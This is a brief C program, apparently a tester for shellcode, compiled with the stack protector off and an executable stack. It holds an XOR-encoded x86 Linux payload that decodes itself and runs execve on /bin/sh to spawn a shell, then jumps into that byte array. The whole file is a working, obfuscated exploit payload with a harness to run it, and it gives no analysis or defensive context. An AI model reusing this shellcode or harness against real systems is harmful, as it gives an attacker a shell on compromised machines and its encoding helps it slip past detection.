/*
A simple program to test shellcode
gcc -fno-stack-protector -z execstack tshell.c
*/

#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\xeb\x0d\x5b\x31\xc9\xb1\x13\x80\x33\xaa\x43\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
"\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x1a\xa1\x23\x49\x67\x2a";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}

